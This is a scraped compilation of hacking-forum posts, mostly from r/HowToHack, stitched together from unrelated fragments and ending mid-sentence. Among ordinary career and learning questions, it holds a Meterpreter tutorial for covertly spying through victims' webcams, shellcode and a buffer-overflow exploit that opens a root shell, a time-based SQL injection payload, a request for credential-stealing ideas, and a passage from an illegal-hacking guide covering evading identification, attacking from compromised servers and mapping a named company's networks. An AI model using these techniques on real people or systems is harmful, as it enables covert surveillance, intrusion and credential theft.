""[pentesterlabs.com](URL You can also look into [Vulnhub.com](URL to find pre-made insecure vm images to practice on. The point is, you should be actively practicing security testing in lab environments, this is the best way to learn. &amp;#x200B; Steps 3 and 4 will take you at least one year, especially if you are actively working full time. Once you have a couple of advance certs like the OSCP, it is time to move on. &amp;#x200B; &amp;#x200B; Time to Become a Penetration Tester &amp;#x200B; &amp;#x200B; If you followed the steps I provided then going from a complete noob (knew nothing about security, networking etc) to penetration tester will take around 5 to 7 years. This time will obviously be shorter if you are already in the IT field, have gone to college for computer science or related field etc. So if you start at the age of 16 you can probably get a penetration tester job by 23 or so, not bad. I started much later in life and it took me about 6 years from starting college to getting hired as a penetration tester. By now you will be very versed in infosec and related technologies. Your resume will be great, multiple certs, multiple jobs showing a clear climb in expertise and desire to improve yourself. You will be more qualified then most people who are applying to Penetration Tester jobs. 100% if you apply to enough places you will get a job. &amp;#x200B; I recommend applying to places that are entry level friendly. Because even with the jobs you had and the expertise you have in labs...that is not practical experience. You will start as a level 1 (or whatever they call it) for at least the first year. But once you have one year of real experience you are golden. If after two years you are not making $100k, look for a new job because you are worth it. &amp;#x200B; &amp;#x200B; Conclusion &amp;#x200B; I never expected the post to be so long, it was some task summarizing a road-map to becoming a penetration tester. For all of you that stuck to it and read the entire post, my hats off to you, and I believe you have what it takes to succeed. Researching will be long and arduous, you will be baffled, confused, and read stuff so dry that that every distraction would be welcomed.

100,vulnerability,HowToHack,Currently fuzzing a VSTARCAM C7824WIP. Tips? Point me in the right direction?,1,9yqqgb,https://www.reddit.com/r/HowToHack/comments/9yqqgb/currently_fuzzing_a_vstarcam_c7824wip_tips_point/,2018-11-20 20:43:07," Hello /r/hacking, A couple of years ago a watched a [Black Hat video on exploiting network cameras](URL ""like a hollywood hacker"". I really enjoyed the talk and as a Linux enthusiast I wanted to do some of the same fuzzing of network security cameras. Recently I bought a cheap network camera on offerup and have been going to town on it. I'd like to try and chronicle what I've found so far, try to include my samples, and see if there is any feedback I can gain from the community to do this better and learn some new techniques. So first of all the camera is the [VSTARCAM C7824WIP](URL It also came with no instruction manual. The camera is kind of interesting for a \~$20 camera. First, it runs entirely off of 5v, so the possibility of homemade battery backups is plausible, since you can run it off standard usb batteries. It has built in wifi, ethernet, sd card slot, and a reset button. It also has a swivel head, controlled by motor, a microphone, a speaker, and night vision with automatic night detection. For a budget camera it seems like a good deal. The bottom of the camera contains the standard login details, a qr code for the app, the serial number, and device id. So I wanted to start this by intercepting traffic on the camera, especially on setup/first login. I created a bridge using \`brctl\` and hooked it up to my usb ethernet card. I then went on the app, searched for the camera on LAN, and watched the initial login process on \`wireshark\`. Here is my view of the important parts of the capture, namely any time I saw a GET request. &amp;#x200B; [Umm...](URL &amp;#x200B; [Ooooops..](URL So the application leaks password data, like seemingly any time the client app connects with the camera. This vulnerability is amplified when the camera is using wireless because anyone with the network key can listen in and transmit packets far easier than on LAN. Even after the password was changed it still leaked it, but never in straight HTTP GET requests like during the setup, but in UDP packets that contain the GET requests. I find this kind of interesting as for right now I don't see any reason for them to use UDP to do this over HTTP. Seems to me like it serves the same purpose. Almost all commands to be run on the device require a username and password at least once, if not twice. &amp;#x200B; [2x creds == 2x security](URL And some times when one of these commands goes through, like this one. &amp;#x200B; URL I can find a response like this later &amp;#x200B; URL Oddly enough some times these requests all come bundled in one UDP packet. Very confusing! &amp;#x200B; [Why though?](URL I then spent some time listening in \`wireshark\`, using the application for a solid ten minutes, changing settings, downloading pictures, So far list of found commands are * snapshot.cgi * trans\_cmd\_string.cgi * get\_status.cgi * get\_params.cgi * set\_datetime.cgi * set\_users.cgi * check\_user.cgi * get\_factory\_param.cgi * livestream.cgi * decoder\_control.cgi * get\_record\_file.cgi * get\_camera\_params.cgi * audiostream.cgi * camera\_control.cgi * set\_misc.cgi * get\_record.cgi * set\_recordsch.cgi * set\_alarm.cgi * set\_update\_push\_user.cgi So far I have been searching for these by hand, I would really like to write a script to automate this. So first thing I wanted to do was to try the snapshot.cgi command, as it seemed to me as the function to take a picture with the camera, as after it is issued, the camera would usually spit out a bunch of binary UDP data. I thought this would be a good place to start my investigation. Here is a capture of the response and the request respectively. Naturally I wanted to do this all in a GET command, so I ran \`GET -C admin:password 192.168.11.140:47499/snapshot.cgi &gt; pic.jpg\` and it worked the first time, although, upon writing this post I couldn't get the thing to work again. I'm guessing it's because the HTTP versions of the commands only work when the device is fresh??? I wanted to test so me limits so I wanted to try a different approach. I fired up Ruby and it's socket library to try and see what I could do. Unfortunately the answer was not much, hoping coming here might answer some questions. First thing I tried was sending direct GET requests via UDP to port 10560 and 10561 (they switch off for some reason) this didn't work and the camera would always reply with ICMP unreachable. So when the app fires up after you have done the first setup process. It does something kind of weird. It sends a UDP packet to broadcast on 8600. Wireshark labels this as the ""ASTERIX"" protocol. When I looked it up on google it seemed to have nothing to do with what I was looking for (some sort of airplane thing IDK). It always sends the same 4 bytes to broadcast, then the camera replies directly to the device, then again on broadcast. &amp;#x200B; [ASTERIX?](URL I managed to replicate this with ruby using \`UDPSocket\`, mostly because I figured this was some kind of knock to get the device to respond. ASTERIX_DATA = ""\x44\x48\x01\x01"" ASTERIX_HOST = ""255.255.255.255"" ASTERIX_DSTPORT = 8600 ASTERIX_SRCPORT = 6801 asterix_socket = UDPSocket.new asterix_socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_BROADCAST, true) asterix_socket.bind(HOST_IP, ASTERIX_SRCPORT) asterix_socket.send(ASTERIX_DATA, 0, ASTERIX_HOST, ASTERIX_DSTPORT) data = asterix_socket.recvfrom(570).first puts ""GOT #{data.length} chars And it works! I get a reply back from the camera and everything. Here's where things get complicated though. After the ASTERIX packets I need to send over another broadcast packet, this one containing another 4 byte sequence. puts ""SENDING f130 broadcast packet"" BC_PACKET_DATA = ""\xf1\x30\x00\x00"" BC_IP = ""192.168.11.255"" BC_SRCPORT = 11618 BC_DSTPORT = 32108 bc_socket = UDPSocket.new bc_socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_BROADCAST, true) bc_socket.bind(HOST_IP, BC_SRCPORT) bc_socket.send(BC_PACKET_DATA, 0, BC_IP, BC_DSTPORT) bc_socket.close puts ""SENT f130 broadcast packet"" After receiving this packet the camera attempts to talk to the client on either port 10560 or 10561 (it seems to choose randomly). I set ruby to listen and it still replies with an ICMP unreachable from my PC. I've gone as far as to write threading to try and listen on both ports, or even open up \`irb\` and open the two ports in two separate windows and leave them on \`recvfrom\` blocking while I run the ""ASTERIX"" section of the code. Still nothing, they never receive anything but, when I send UDP data through irb it shows up on the port. Once the camera gets the ICMP unreachable it's game over and the sequence needs to be restarted from the beginning. Maybe someone has some insight into this phenomenon. For anyone interested this was the code I used to listen in on the ports. This section specifically is waiting for information on either port so I know which one to use when the camera replies. current_comm_port = 0 while current_comm_port == 0 in_sockets.each do |port, in_socket| begin puts ""WAITING FOR DATA"" data = in_socket.recvfrom_nonblock(24).first puts ""DONE WAITING, RECIEVED"" if data[1] == ?A # Good input has a A 2nd char puts ""REPLY RECEIVED ON #{port}!"" current_comm_port = port break else puts ""REPLY MANGLED!"" end rescue IO::EAGAINWaitReadable =&gt; e puts ""NO DATA ON #{port}"" end end end in_sockets.each { |k, v| v.close } puts ""FOUND PORT! #{current_comm_port}"" &amp;#x200B; I also tried decompiling the android app behind the camera and unfortunately it decompiled to smali and I'm not familiar with it. &amp;#x200B; Would love some insight and tips. Let me know if you spotted anything interesting in my post!"

I am always learning myself so any constructive criticism is greatly appreciated. We will be starting with easy VM's and will be following published guides.

Data collection: Various methods including Google search are used to get target system data.

There are many free tools and services available in the market which can give you information like database or table names, DB versions, software versions, hardware used and various third-party plugins used in the target system. 2. Vulnerability Assessment: Based on the data collected in the first step one can find the security weakness in the target system. This helps penetration testers to launch attacks using identified entry points in the system. 3. Actual Exploit: This is a crucial step. It requires special skills and techniques to launch an attack on the target system. Anyone an use their skills to launch an attack on the system. This will normally be either: a payload we are delivering, more data collection about our target, privilege escalation, or a pivot point into another system. (Not limited, you can be creative.) 4. Repeat 1 through 3 until we have root or have gotten what we need from the system. &amp;#x200B; &amp;#x200B; At the end of a pentest an ethical hacker will deliver result analysis and start report preparation.

Well use the powerful Meterpreter and Kali Linux to hack into the victims webcam. Well take full control of the webcam, turn it on, get snapshots and even stream live video without anyone ever finding out. In early 2014, a hacker was sentenced to 18 months for doing just this to Miss Teen USA 2013. He found a vulnerability in her computer (like some outdated software), took a few compromising photos from the webcam and blackmailed the victim to send more photos. The method he used is exactly what well be trying out here. Our best friend meterpreter is going to help us with this hack. With Meterpreter we can control someones webcam, install a keylogger or plant your own viruses, steal private data and do pretty much anything on the victims computer. For this tutorial, Im assuming that youve already used an attack module to exploit a vulnerability using Metasploit (How to do this?). Now lets get to it. How to hack webcams? Step 1: Set up meterpreter. After weve successfully exploited the victim, we now have the option to set a payload of our choice. The payload tells metasploit what to do on the victims computer once it breaks in. Meterpreter is our payload. The following command sets up our payload: set payload windows/meterpreter/reverse_tcp If the attack was successful, metasploit automatically installs meterpreter on the target system and we can move on to hacking the webcam. Step 2: Find the webcam. Meterpreter has a built-in module for searching and controlling the remote systems webcam. We can start off by searching if the system even has a webcam or not.me. The command below is used for that, it also returns us the name of the webcam. meterpreter &gt; webcam_list And now you should see your targets webcam(s) listed in the output. Step 3: Take snapshots If the last command gave us a webcam we can go ahead and snap a photo: meterpreter &gt; webcam_snap And now you should see a picture has been saved in the folder /opt/framework3/msf3 Simply head over there Step 4: Stream real time video from the hacked webcam So we just took a picture, lets see how to get a live video stream. We can do this by typing the command below: (Were using p parameter to specify the directory we want to give to the video streaming file) meterpreter &gt; run webcam -p /var/www This command fires up the victims webcam and sends its video output to /var/www/webcam.htm. You can open up this file and check out whats going on at the other end in a live video stream. For inquires, requests you can leave me a message via freelancerantonlfromupwork@gmail.com"

There use to be a lot of sites like a community where hackers would post info on newly discovered vulnerabilities and how to exploit/patch them. In this example, someone posted a mysql exploit. 2. After people share the exploit, you would likely compile into an executable or script. In this example, I would take the mysql exploit and compile to an exe. 3. Next I would scan for an open port. In this example, I would use a scanner and scan 192.168.0.0-192.168.255.255 for port 1433 listen which would be the mysql port. 4.

After digging heavily into the network side of things with security, I've started to turn my attention toward the web app side of things. I've got a pretty good hang on the basic concepts of SQLi, XSS, that sort of thing. And so recently I've been pouring over the entries on exploit-db.com, the web app section in particular. I can usually get the gist of what the tester has done to identify/prove the vulnerability. What I can't quite envision is exactly how some of these people are doing the actual testing. Surely they're not actually directly attacking the site and service directly, a-la blackhat, right? I mean there's one contributor there who seems to be just banging out multiple submissions daily. I won't call out with names, but visit the site and you'll see pretty quickly. Here's my loose guess at how one might get to test these things; maybe someone here can tell me if I'm close to the mark or not. Let's take SQLi for instance. Many or all of these exploit submissions include links to a plugin on the site(s) which they have found vulnerable. Also, usually there's a link to a demo of the plugin. So, are they maybe downloading these plugins, somehow setting them up to function with a home-lab SQL database they've created, and then essentially attempting to hack their own DB through the vectors available in that plugin? Like doing it all through a locally hosted test web site? Anyway, hopefully what I'm asking makes sense. I'd love to be able to try testing some of these things in a legitimate manner, if I could wrap my head around the setup part. DVWA, bWAPP, and all those things are great, but I feel like they lack the quirks and... realness?... of real-world environments. Thanks in advance for any assistance or clarification!"

My plan was to use sslStrip2 to downgrade hsts communications on a network in order to sniff a users username and password as they connect to a social media service. But after messing around with it i've realised that all browsers now have a preloaded hsts list which ensures all communication with the websites listed is through https. (side note - reddit is still vulnerable on internet explorer 10) I'm trying to find something new now. Other options i've thought of are; -creating a chrome extension which would act as a key logger, or some other malicious chrome/firefox extension -attempting to breach a devices security over a LAN and retrieving social media credentials -creating an application which connects to social media, like a facebook game app, which could be used for malicious purposes. -Some sort of botnet? After researching, I'm pretty sure finding a security vulnerability on any social media platform directly would be too difficult - that's why I thought using an ssl downgrade attack would be good as it is a protocol which is used by every large website. do any of you have any recommendations or can you think of any other/better direction for me to try?

The report explains that for the SQLi this input was used: if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'""XOR(if(now()=sysdate(),sleep(9),0))OR""*/ The result should be a significantly longer callback time (as in ""sleep(9)"" programmed). But if I insert this code into the input, nothing suspecting happens. Does anyone know how the ""hack"" works? Do I have to make the POST through PHP or Python so no browser is involved?"

When you have a Windows 10 device that you use a Microsoft account to login to, the computer allows you to login if you are offline, and asks you for the last used password on the device. Would this mean that somewhere in the Windows 10 filesystem, there is a file, even a temp file, that holds the last used password on the device? Seeing as that would normally be the password for the Microsoft account itself, is this not a massive vulnerability? If someone were to gain access to the filesystem and find said password file, even if it were hashed and encrypted, it could still be brute forced given enough time. Is this a thing, or has Microsoft done more things to make sure something like this can't happen?

155,vulnerability,HowToHack,Beginners Frequently Asked Questions for Hacking,37,5pxtmw,https://www.reddit.com/r/HowToHack/comments/5pxtmw/beginners_frequently_asked_questions_for_hacking/,2017-01-25 05:34:33,"This post is for all beginners who wants to become a hacker / Penetration Tester. As the title says, Hacking Beginners Frequently Asked Questions. In my own experiences, these questions are frequently asked by beginners. This post will help them in answering their basic questions and clearing out their confusions. Questions 1) are programming skills required to be a hacker / Penetration tester? In web application penetration testing, basic understanding of HTML, Javascript, SQL, PHP/ASP are required, though it is important to note that their mastery is not required. It means you are not required to be a developer or an expert programmer to do web application penetration testing, for example you should be able to figure out what the code does, how to manipulate the code, and how to do automation. In Web Application Penetration testing, sometimes you have to do some automation for example in Blind SQL injection. You have to write your own script to automate the injection. In such cases, or if you have to automate an exploit. Automation skills are required. Python comes in handy at this point. In System / Network level penetration testing, Scripting like Python is required to do automation, although if you have to write a Zero Day exploit. You are required to have expert level C/C++ programming skills. It is also worthy to note that, only mastery in C/C++ is not a guarantee that you could find Zero Day exploits. For that mastery in Other skills like fuzzing, exploit development , operating systems, exploitation techniques are required. 2) Where to start learning Web Application Security? Dont choose a single source, choose a vulnerability for example SQL injection, do search about it from different sources and then most importantly practice. Always practice what you learn, while practicing you will gonna learn more then tutorials or books taught you about that vulnerability. Take you training as vulnerability by vulnerability. After you think you are done with one vulnerability move to next, apart from learning it offensively, Always study how to defend against that vulnerability. It will give more knowledge on attack vectors. 3) Can you give me a private shell? Well , this misconception must be put to an end. Shell is basically a script that helps you execute commands on remote server. other features might be, file uploads, directory browsing, changing permissions etc, but the basic thing that all shells, either GUI based or console. They just execute the commands which means that anything that can be done with GUI based or so called private shells, they can be done with just a script to execute commands. No shell has some supernatural abilities. They just execute the commands. So their is nothing as a Private Shell better learn how to do things manually by just a CMD or console shell. It will increase your knowledge about Scripting, OS commands. 4) Which Operating system is best for hacking? No operating system has any magics to help you in Hacking/ Penetration testing. All operating systems have basic responsibilities that are resource management, user interface, managing devices, scheduling tasks etc. There are several Penetration Testing distros available, like Backtrack, Kali Linux, Backbox etc. All of these distros have some open source tools pre-installed in them. You can also install those tools in any other operating system. 5)How much important metasploit is in hacking? Metasploit is just a exploit arsenal. All you gotta do is to launch the exploit. Anyone can learn metasploit from scratch within 2 weeks maximum. All the exploits are patched. So on a scale of 1-to-10 I would give it 1.0 in terms of importance in Penetration testing."

160,vulnerability,HowToHack,Hacks by hand,12,5l3zgm,https://www.reddit.com/r/HowToHack/comments/5l3zgm/hacks_by_hand/,2016-12-31 02:35:34,This might be a stupid question but I'm gonna ask it anyways. Are all hacks done via an existing program? I was under the impression that one finds a vulnerability and exploits it. After finding said vulnerability then it's time to make a program to exploit said vulnerability and run it against other similar things to see if the vulnerability works. But there are so many tools out there already that seem to be point and click. So I suppose my question is this. When looking for a vulnerability (or learning and wanting to manually exploit it without software that does it) what do you do? Say for an sql injection do you just manually enter things in the address bar? Are there other attacks where you manually do something like this with no software needed ?
161,vulnerability,HowToHack,How and why does this buffer overflow work?,2,5mftwd,https://www.reddit.com/r/HowToHack/comments/5mftwd/how_and_why_does_this_buffer_overflow_work/,2017-01-07 07:06:43,"I'm reading Jon Erickson's *Hacking: The Art of Exploitation* (second edition) and there's a programme in it called notesearch which runs effectively under root and has a stack overflow vulnerability. Here's the bit with the vuln in notesearch.c: if(argc &gt; 1) // If there is an arg strcpy(searchstring, argv[1]); // that is the search string And here's exploit_notesearch.c, which does exactly what its name says and fires up a root shell: #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char shellcode[]= ""\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"" ""\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"" ""\xe1\xcd\x80""; int main(int argc, char *argv[]) { unsigned int i, *ptr, ret, offset=270; char *command, *buffer; command = (char *) malloc(200); bzero(command, 200); // zero out the new memory strcpy(command, ""./notesearch \'""); // start command buffer buffer = command + strlen(command); // set buffer at the end if(argc &gt; 1) // set offset offset = atoi(argv[1]); ret = (unsigned int) &amp;i - offset; // set return address for(i=0; i &lt; 160; i+=4) // fill buffer with return address *((unsigned int *)(buffer+i)) = ret; memset(buffer, 0x90, 60); // build NOP sled memcpy(buffer+60, shellcode, sizeof(shellcode)-1); strcat(command, ""\'""); system(command); // run exploit free(command); } I think I understand the big picture: since the stack grows towards lower memory addresses and each element in an array is at a higher address than the last, the exploit executes notesearch with a search string longer than 100 characters, so the extra characters will overflow into the previous stack frame and overwrite the return address. The NOP sled is there to ensure the shellcode will get executed no matter which system it's running in. What I don't get is why the address stored at ret is repeatedly copied into the buffer; the book explains it, but I didn't understand it. What exactly is in that address? Why isn't it enough with overwriting memory with the shellcode?"

Obviously, one never stops learning either :) I've never gotten far enough on my own to really start utilizing/implementing vulnerability assessment software. I saw an interesting video on youtube using Nessus - I'm using Kali 2.0, and it's not installed by default, but Sparta is. It seems like a very...well, almost too easy tool. You add in your hosts and it does the analysis for you. So my questions are as follows. 1. I'm assuming programs like these are very ""loud."" Not for those trying to be stealthy. Is this accurate? 2. Is it standard procedure, so to speak, to use tools like this? Or is it more realistic that one would do some in depth scanning, with tools such as nmap, on their own and do their own assessment to see what is exploitable? 3. Of these types of tools available, what are the most widely used programs in the industry and where would be a good resource to begin learning them? 4. Is this how vulnerability assessment of a host is normally done? If not, what is? Thank you for reading and for your time."

Im on a windows 8 laptop, I have VMware Workstation Pro where I run Kali Linux (2016.2) and Metasploitable 2. I was recently following a few tutorials where it showed how to hack into Metasploitable and get a shell session on it. The first thing to do was to do a port scan with Nmap, issuing the command nmap -sS 192.168.133.0/24 It would then show the IP adress of all connected devices and the ports that they have open. Metasploitable was easily identifiable as it had a huge amount of open ports, I also checked it was the right machibe by IP. The first vulnerability was with port 1524 (I think this was the port number, Im not sure). The command to get the session for this port was telnet 192.168.133.131 1524 It was that easy. But obviously the difficulty changes with other ports. -=[ QUESTION ]=- I'm new to this world of pentesting and I know some of the basics, more theory than practice. The only ""method"" I know to break into metasploitable is to scan open ports, check any vulnerabilities they have and exploit them. Is there any other way to break into a machine? I'm sure there are, but can anyone suggest any?"

I always seem to hear of the same types of attacks whenever news of hacks go online. Either the attackers used social engineering, or utilized SQL injection, or injected JavaScript with XSS, or initiated a brute-force/dictionary attack on a server/website which didn't have time-outs for multiple unsuccessful attempts. It just seems like that's all there is to hacking, web hacking anyway, and I've been wondering, what happens when people patch these vulnerabilities up? It should be relatively easy to patch up an SQL injection vulnerability, along with an XSS one. After they do that, what can an attacker do? In summary, I'm asking why the same types of hacks go on the news all the time. Shouldn't big companies know of these and protect against them? And if they do, what can a hacker do then? I just keep on hearing of the same stuff and am left wondering, is that all hacking is? Thanks."

180,vulnerability,HowToHack,Looking for a professional training in Europe,3,4ypjol,https://www.reddit.com/r/HowToHack/comments/4ypjol/looking_for_a_professional_training_in_europe/,2016-08-21 01:27:07,"Hi Redditors, TL;DR: I'm looking for a payed professional training in Europe to go deeper. I already read the MegaThread and didn't found about professional training. I'm working in a small company that provides network and security services to other compagnies. I'm totally new to the field of pentesting but my company want me to progress and become the pentesting's reference, because lots of our customers asked for these skills. I already had the opportunity to pentest 4 customers and they (and we) were happy of the results. I already did: - OSINT - Vulnerability scans - Webapp scans - One easy sql injection with SQLmap. I retrieved a table containing user accounts (and cleartext passwords) of a web intranet portal. Then I used these password against the portal, which gave me access to lots of data. - One social engineering by buying a domain similar to the customer one (only TLD differs), making a ""new"" intranet login portal for users and sending them a mass mailing. This portal gave me +-100 usernames/passwords and I used them later to access OWA and other stuffs. - Another SE attack to stole tokens needed to VPN into the internal network. First user didn't have rights to login into VPN and I ran out of time to make other tries. But I'm sure the process should succeed - While on the phone with users and on their desktop with TeamViwer, I successfully deployed Meterpreter (Paranoid mode needed to evade AV/IPS) but I wasn't able to escalate privileges or persist. - Physical security, by going to a customer site, finding a free office to launch scans, asking a janitor to give me access to a network room (which he did), collecting hashes with Responder (+-100 usernames/password cracked with John), dropping USBs with an interesting_file.bat (meterpreter)... I've been caught several days later while another janitor gave me access to another Network room. He also told me he could give me access to the main server room if needed :D I had to code a little bit: - A Python script to use Searx (FOSS metasearch engine with an API) for phone numbers related to provided emails. I choosed Python as an exercise and it was the first time I used it. The code is awfull and lot of things are hardcoded. - Some PHP code to run my SE portal and log credentials, IPs, browsers... - Really small fix/enhancement on the scripts I downloaded from Github. So I think I know lots of the puzzle pieces (but not all) and I feel I'm not able to put them all together to get the big picture. I know I'm still a script kiddies and I want to go deeper and become faster at pentesting (because it took me hours and I have other things to do at work). I, and the compagny I work for, think I need an intensive live training. I'm not afraid of going to a too advanced training because I know it will force me to make quick progress to catch the train. My main fear is to attend a too basic training where I won't learn any new tips and spend money for nothing. So I would like the advices of real professional Pentester about the best training to take to make progress. What do you think about this training planning ? - URL - URL - URL - URL - URL Do you know better trainings? I'm based in Belgium but I can travel Europe and money is not a big deal, if I convince my boss that a training is worth it."

I've been now searching for so long for an exploit that uses this vulnerability, but all I could find is some bug fix reports from Oracle, openSUSE, ...etc that reference it perhaps i need to learn more and actually make my own exploit for this?

The attack is really obvious. Is there any way to make it so the victim doesn't immediately know he's being attacked?

187,vulnerability,HowToHack,Decrypting a ZIP File,41,4eyf1q,https://www.reddit.com/r/HowToHack/comments/4eyf1q/decrypting_a_zip_file/,2016-04-16 05:37:30,"I'm not sure if any of you are familiar with [Hacking-Lab](URL but I am currently working on one of its challenges. The goal is simple: break into a password protected ZIP file. I've done quite a bit of research on the subject, but I would like to talk to some other folks and make sure that I haven't overlooked something. **WARNING: IF YOU ARE ALSO WORKING ON THIS CHALLENGE, THIS DISCUSSION MAY CONTAIN SPOILERS!** #What I Know I went into this challenge knowing very little about ZIP files. My research into the subject revealed the following: * The ZIP file format is an old method of file compression created by Phil Katz * They can be encrypted with a user entered password * The cipher used to encrypt the data is (traditionally) the PKZIP cipher * They are vulnerable to known plaintext attacks * There are tools available that can brute force the password, such as [John the Ripper](URL #My Solution My first thought was to attempt a plaintext attack against the file. However, I don't know any of the plaintext contained within the file. I've read about several other kinds of plaintext attacks (chosen, ciphertext, etc), however, I'm not sure if any of those would work in this situation. As I understand it, this vulnerability stems from the fact that the 12 byte encryption header on the file is built out of four ""keys"", each of which relies on the previous one. So, if you have enough bytes of the plaintext, and the corresponding ciphertext, you can work backwards to get the encryption key. The simplest (and most time efficient) method for decrypting the file seems to be a brute force attack. I understand brute forcing in principle, and I can see how a short password would be easy for a computer to eventually guess. What I don't understand is how a ZIP file might somehow be more vulnerable to brute force than something else. I'm confident that I can throw John the Ripper at the file, and get the password. What I would like to understand is *why*, and if that isn't as elegant as something else that I might attempt. Any discussion on this is much appreciated. If you feel like I've missed the point of this challenge, please let me know. The same goes for if my thinking is incorrect in some way. I'm here to learn, after all. :)"

206,vulnerability,HowToHack,"How would I identify the ""weakest link"" in a network?",3,3ormni,https://www.reddit.com/r/HowToHack/comments/3ormni/how_would_i_identify_the_weakest_link_in_a_network/,2015-10-15 07:16:29,"Hi all, This is actually my first post, been a passive redditor for some time now. Lately I've been reading a lot about pen testing and it's become a real big interest of mine. My question is: How do I identify the machine or service in an internal network (that I am not on) that has x vulnerabilities? I've heard of nmap, or DNS attacks once you know their name servers, but I feel this is limited in ability, but please correct me if I am wrong. If that's not clear enough, how about this: How would someone exploit an internal machine within a network that they are not connected to (remotely). To do this, I assume I would need to figure out the vulnerabilities of every machine I could possibly scan for within this network. Again, correct me if I am wrong. What if I only know the companies name/website and a few employees? (Usually, this information is very easy to obtain through a Google search). The reason I ask, is because as I understand, in order to exploit a host to enable pivoting, we would have to first perform recon to identify which vulnerabilities the system is prone to. Once we have this information, we can use it to search for the exploit used to take over that machine, allowing the potential for pivoting. To further clarify, this is a situation I would like to hypothetically achieve: Worker A is derping around at his/her desk, typically an average worker, nothing special nothing important just a regular worker who MAY be susceptible to a phishing attack. He or she then receives an e-mail (or another attack vector?) which contains a file that once opened, allows a Meterpreter session to be opened, which allows the magic to happen. But wouldn't the attacker have to already know: 1) The vulnerability in order to execute the right exploit? 2) The host information? 3) Who sits there? As you can tell by now, I am just a beginner here. I do understand basics and I have a programming background as well I've worked in IT and IT Sec. Anything you guys can provide in terms of information or resources, would be greatly appreciated. I really hope I don't get troll or hateful responses as this is a genuine question. If this is the wrong place, pleases direct me to the appropriate subreddit and I will happily ask there. Thank you all for taking time to read my question."
207,vulnerability,HowToHack,What Is The Real Difference Between White and Gray Hat?,7,3p2t2y,https://www.reddit.com/r/HowToHack/comments/3p2t2y/what_is_the_real_difference_between_white_and/,2015-10-17 15:23:26,"Disclaimer: I'm a total noob and this is strictly my own opinion and curiosity. I have no experience in security or hacking and I don't know any real industry/company practices, so I'm not trying to pretend to have that kind of knowledge. I just want to know what's going on here. I looked through this page a bit [Link](URL and I couldn't help but wonder why grey hat hackers aren't being put to use (those who are willing to be) as basically mercenaries/independent testers. There are companies that offer bug bounties, so why shouldn't that be a common practice? Wouldn't it be a lot better to have 1000 people testing your network/sites at random with nothing to lose in addition to company employees, rather than having only the employees? Wouldn't it send a much clearer message to a company to bring a list and say ""I successfully compromised 1800 customers by collecting their login info over the course of 3 days because you never saw me coming"" than to say ""I found a vulnerability in your credentials system. I didn't bother it, but it's there""? From this page, it seems like ""gray hat"" is purely a hypothetical or speculative term, meaning a person who can find and exploit vulnerabilities, but they ""can't be trusted"" because they *might* tell somebody other than the site owner and then somebody else *might* do something with that info. When is the last time a black hat hacker asked for permission to compromise a system? Isn't it unrealistic to expect someone to ask for permission, and thus know that the company is aware of their activity, and do nothing with the information (see clearer message), and allow that to be a comparison to a theoretical malicious attack? No black hat would show up, find a vulnerability, and say ""Well, there it is. Better not touch it. I'm out of here"". "

I'm writing this to demystify hacking, to show how simple it is, and to hopefully inform and inspire you to go out and hack shit. If you have no experience with programming or hacking, some of the text below might look like a foreign language. Check the resources section at the end to help you get started. And trust me, once you've learned the basics you'll realize this really is easier than filing a FOIA request. __-- 2 -- Staying Safe__ This is illegal, so you'll need to take same basic precautions: 1. Make a hidden encrypted volume with [Truecrypt 7.1a](URL 1. Inside the encrypted volume install [Whonix](URL 1. (Optional) While just having everything go over Tor thanks to Whonix is probably sufficient, it's better to not use an internet connection connected to your name or address. A cantenna, aircrack, and reaver can come in handy here. As long as you follow common sense like never do anything hacking related outside of Whonix, never do any of your normal computer usage inside Whonix, never mention any information about your real life when talking with other hackers, and never brag about your illegal hacking exploits to friends in real life, then you can pretty much do whatever you want with no fear of being v&amp;. NOTE: I do __NOT__ recommend actually hacking directly over Tor. While Tor is usable for some things like web browsing, when it comes to using hacking tools like nmap, sqlmap, and nikto that are making thousands of requests, they will run very slowly over Tor. Not to mention that you'll want a public IP address to receive connect back shells. I recommend using servers you've hacked or a VPS paid with bitcoin to hack from. That way only the low bandwidth text interface between you and the server is over Tor. All the commands you're running will have a nice fast connection to your target. __-- 3 -- Mapping out the target__ Basically I just repeatedly use [fierce.pl](URL whois lookups on IP addresses and domain names, and reverse whois lookups to find all IP address space and domain names associated with an organization. For an example let's take Blackwater. We start out knowing their homepage is at academi.com. Running fierce.pl -dns academi.com we find the subdomains: 67.238.84.228 email.academi.com 67.238.84.242 extranet.academi.com 67.238.84.240 mail.academi.com 67.238.84.230 secure.academi.com 67.238.84.227 vault.academi.com 54.243.51.249 URL Now we do whois lookups and find the homepage of URL is hosted on Amazon Web Service, while the other IPs are in the range: NetRange: 67.238.84.224 - 67.238.84.255 CIDR: 67.238.84.224/27 CustName: Blackwater USA Address: 850 Puddin Ridge Rd Doing a whois lookup on academi.com reveals it's also registered to the same address, so we'll use that as a string to search with for the reverse whois lookups. As far as I know all the actual reverse whois lookup services cost money, so I just cheat with google: ""850 Puddin Ridge Rd"" inurl:ip-address-lookup ""850 Puddin Ridge Rd"" inurl:domaintools Now run fierce.pl -range on the IP ranges you find to lookup dns names, and fierce.pl -dns on the domain names to find subdomains and IP addresses. Do more whois lookups and repeat the process until you've found everything. Also just google the organization and browse around its websites. For example on academi.com we find links to a careers portal, an online store, and an employee resources page, so now we have some more: 54.236.143.203 careers.academi.com 67.132.195.12 academiproshop.com 67.238.84.236 te.academi.com 67.238.84.238 property.academi.com 67.238.84.241 teams.academi.com If you repeat the whois lookups and such you'll find academiproshop.com seems to not be hosted or maintained by Blackwater, so scratch that off the list of interesting IPs/domains. In the case of FinFisher what led me to the vulnerable finsupport.finfisher.com was simply a whois lookup of finfisher.com which found it registered to the name ""FinFisher GmbH"". Googling for: ""FinFisher GmbH"" inurl:domaintools finds gamma-international.de, which redirects to finsupport.finfisher.com ...so now you've got some idea how I map out a target. This is actually one of the most important parts, as the larger the attack surface that you are able to map out, the easier it will be to find a hole somewhere in it. __-- 4 -- Scanning &amp; Exploiting__ Scan all the IP ranges you found with nmap to find all services running. Aside from a standard port scan, scanning for SNMP is underrated. Now for each service you find running: 1. Is it exposing something it shouldn't? Sometimes companies will have services running that require no authentication and just assume it's safe because the url or IP to access it isn't public. Maybe fierce found 